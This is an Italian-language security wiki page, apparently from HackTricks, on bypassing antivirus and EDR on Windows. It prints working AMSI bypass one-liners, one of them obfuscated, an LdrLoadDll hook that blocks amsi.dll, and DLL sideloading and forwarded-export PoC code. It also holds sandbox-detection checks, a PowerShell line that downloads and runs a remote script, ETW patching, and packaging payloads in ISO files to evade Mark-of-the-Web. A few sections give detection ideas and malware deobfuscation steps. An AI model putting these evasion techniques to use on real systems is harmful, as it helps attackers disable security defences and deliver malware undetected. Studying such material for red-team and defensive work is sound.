# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Disabilitare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare Windows Defender dal funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare Windows Defender fingendo un altro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologia di evasione AV**

Attualmente, gli AV usano diversi metodi per verificare se un file è maligno o meno: static detection, dynamic analysis, e per gli EDR più avanzati, behavioural analysis.

### **Rilevamento statico**

Il rilevamento statico si ottiene segnalando stringhe note come malevole o array di byte in un binario o script, ed estraendo anche informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare strumenti pubblici noti può farti essere scoperto più facilmente, poiché probabilmente sono già stati analizzati e contrassegnati come maligni. Ci sono alcuni modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se cripti il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di qualche tipo di loader per decrittare ed eseguire il programma in memoria.

- **Obfuscation**

A volte tutto ciò che serve è cambiare alcune stringhe nel binario o nello script per superare l'AV, ma questo può richiedere molto tempo a seconda di cosa stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi strumenti, non ci saranno firme note come malevole, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è ThreatCheck. Divide essenzialmente il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente; in questo modo può dirti esattamente quali stringhe o byte nel tuo binario vengono segnalati.

Consiglio vivamente di guardare questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) su AV Evasion pratico.

### **Analisi dinamica**

L'analisi dinamica è quando l'AV esegue il tuo binario in una sandbox e osserva attività malevole (es. tentare di decriptare e leggere le password del browser, effettuare un minidump su LSASS, ecc.). Questa parte può essere un po' più complessa da affrontare, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare l'analisi dinamica degli AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il flusso di lavoro dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare il sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse a disposizione (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Qui puoi anche essere molto creativo, per esempio controllando la temperatura della CPU o persino la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi targettizzare un utente la cui workstation è joinata al dominio "contoso.local", puoi verificare il dominio del computer per vedere se corrisponde a quello specificato; se non corrisponde, puoi far terminare il tuo programma.

Si scopre che il computername della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione: se il nome corrisponde a HAL9TH, significa che sei dentro la sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come detto prima in questo post, **gli strumenti pubblici** alla fine **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un altro progetto meno conosciuto che dumpa comunque LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, probabilmente è uno dei pezzi di malware più segnalati dagli AV e dagli EDR; sebbene il progetto sia molto interessante, è anche un incubo cercare di adattarlo per eludere gli AV, quindi cerca alternative per ottenere ciò che vuoi fare.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei sample** in defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi controllare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì fino a quando non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando è possibile, dai sempre la **priorità all'uso di DLL per l'evasione**; per esperienza, i file DLL sono solitamente **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di essere eseguito come DLL, ovviamente).

Come possiamo vedere in questa immagine, un DLL Payload da Havoc ha un tasso di rilevamento di 4/26 in antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima che il(s) payload(s) malevolo accanto l'uno all'altro.

Puoi controllare i programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo script powershell seguente:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando stamperà l'elenco dei programmi suscettibili a DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Consiglio vivamente di **explore DLL Hijackable/Sideloadable programs yourself**, questa tecnica è piuttosto stealth se eseguita correttamente, ma se usi pubblicamente noti DLL Sideloadable programs potresti essere facilmente scoperto.

Semplicemente posizionare una malicious DLL con il nome che un programma si aspetta di caricare non farà eseguire il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla proxy (e malicious) DLL alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà due file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) che la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Lo chiamerei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Consiglio **vivamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copia-incolla):
1) Copiare la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona un `NCRYPTPROV.dll` maligno nella stessa cartella. Un `DllMain` minimo è sufficiente per ottenere l'esecuzione di codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (firmato) carica la side-by-side `keyiso.dll` (firmata)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward a `NCRYPTPROV.SetAuditingInterface`
- Il loader quindi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sui forwarded exports dove il modulo di destinazione non è un KnownDLL. I KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Vedi l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitora LOLBins (per es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Genera allerta su catene processo/modulo come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` sotto percorsi scrivibili dall'utente
- Applica politiche di integrità del codice (WDAC/AppLocker) e nega write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un unico strumento; se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di scansionare solo **file on disk**, quindi se riuscivi in qualche modo a eseguire payload **directly in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI, o ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permette alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in forma non crittografata e non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso all'eseguibile da cui lo script è stato lanciato, in questo caso, powershell.exe

Non abbiamo scritto nessun file su disco, ma siamo comunque stati rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene passato attraverso AMSI. Questo influisce persino su `Assembly.Load(byte[])` per il caricamento in-memory. Per questo motivo si consiglia l'uso di versioni di .NET inferiori (come 4.7.2 o precedenti) per l'esecuzione in-memory se vuoi evadere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI lavora principalmente con rilevamenti statici, modificare gli script che provi a caricare può essere un buon metodo per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di deobfuscate gli script anche se hanno più livelli di offuscamento, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come è fatta. Questo rende non così immediato l'evadere. Sebbene, a volte, tutto ciò di cui hai bisogno sia cambiare un paio di nomi di variabili e sei a posto, dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo powershell (così come in cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo come utente non privilegiato. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato molteplici modi per evadere la scansione AMSI.

**Forzare un errore**

Forzare l'inizializzazione di AMSI a fallire (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenire un uso più esteso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una riga di codice powershell per rendere AMSI inutilizzabile per l'attuale processo powershell. Questa riga è stata ovviamente rilevata dallo stesso AMSI, quindi è necessaria qualche modifica per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente questo verrà segnalato una volta pubblicato, quindi non dovresti pubblicare codice se il tuo piano è rimanere non rilevato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG; in questo modo il risultato della scansione effettiva sarà 0, che viene interpretato come risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche per bypassare AMSI con powershell, consulta [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Bloccando AMSI impedendo il caricamento di amsi.dll (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nel piazzare un hook in user-mode su `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non vengono eseguite scansioni per quel processo.

Schema di implementazione (x64 C/C++ pseudocodice):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona su PowerShell, WScript/CScript e custom loaders allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio di script via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti da riga di comando troppo lunghi.
- Osservato in uso da loader eseguiti tramite LOLBins (es., `regsvr32` che chiama `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Rimuovere la signature rilevata**

Puoi usare un tool come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo tool scansiona la memoria del processo corrente alla ricerca della signature AMSI e la sovrascrive con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare una lista di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare Powershell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionati da AMSI. Puoi farlo:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per audit e troubleshooting, ma può anche rappresentare un **problema per gli attacker che vogliono evadere il rilevamento**.

Per bypassare PowerShell logging puoi usare le seguenti tecniche:

- **Disable PowerShell Transcription and Module Logging**: puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi farlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una powershell senza difese (questo è ciò che usa `powerpick` di Cobalt Strike).

## Obfuscation

> [!TIP]
> Diverse tecniche di obfuscation si basano sulla cifratura dei dati, il che aumenterà l'entropia del binario rendendolo più facile da rilevare per AVs e EDRs. Fai attenzione a questo e valuta di applicare la cifratura solo a sezioni specifiche del tuo codice che sono sensibili o devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune incontrare più livelli di protezione che bloccano decompiler e sandbox. Il workflow sotto riesce in modo affidabile a **ripristinare un IL quasi originale** che può poi essere decompilato in C# con tool come dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx cifra ogni *method body* e lo decripta dentro il costruttore statico del *module* (`<Module>.cctor`). Questo inoltre patcha il checksum del PE quindi qualsiasi modifica causerà il crash del binario. Usa **AntiTamperKiller** per localizzare le tabelle di metadata cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando costruisci il tuo unpacker.

2.  Symbol / control-flow recovery – dai in input il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi di variabili originali e decritterà le stringhe costanti.

3.  Proxy-call stripping – ConfuserEx sostituisce le chiamate di metodo dirette con wrapper leggeri (aka *proxy calls*) per rompere ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo step dovresti vedere normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Manual clean-up – esegui il binario risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il *vero* payload. Spesso il malware lo memorizza come un array di byte TLV-inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** necessità di eseguire il sample malevolo – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite code obfuscation e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, a compile time, codice obfuscated senza usare strumenti esterni e senza modificare il compiler.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge uno strato di operazioni obfuscated generate dal framework di C++ template metaprogramming che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un x64 binary obfuscator in grado di obfuscare diversi file PE, inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice metamorphic code engine per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation fine-grained per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni regolari in ROP chains, sovvertendo la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da internet ed li esegui.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che applicazioni scaricate raramente faranno scattare SmartScreen avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al download di file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo del Zone.Identifier ADS per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payloads ricevano il Mark of The Web è impacchettarli dentro una sorta di container come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta payloads in container di output per eludere Mark-of-the-Web.

Esempio d'uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Analogamente a come AMSI viene disabilitato (bypassed), è anche possibile far sì che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare subito, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere rilevato da AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) già fornisce la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel creare un nuovo processo sacrificiale, iniettare il tuo codice maligno di post-exploitation in quel nuovo processo, eseguire il codice e, una volta terminato, terminare il nuovo processo. Questo ha sia benefici che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **outside** del nostro Beacon implant process. Ciò significa che se qualcosa nella nostra azione di post-exploitation va storto o viene rilevata, c'è una **molto maggiore probabilità** che il nostro **implant sopravviva.** Lo svantaggio è che hai una **maggiore probabilità** di essere catturato dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice maligno di post-exploitation **nel suo stesso processo**. In questo modo puoi evitare di dover creare un nuovo processo e farlo scansionare da AV, ma lo svantaggio è che se qualcosa va storto durante l'esecuzione del tuo payload, c'è una **molto maggiore probabilità** di **perdere il tuo beacon** poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

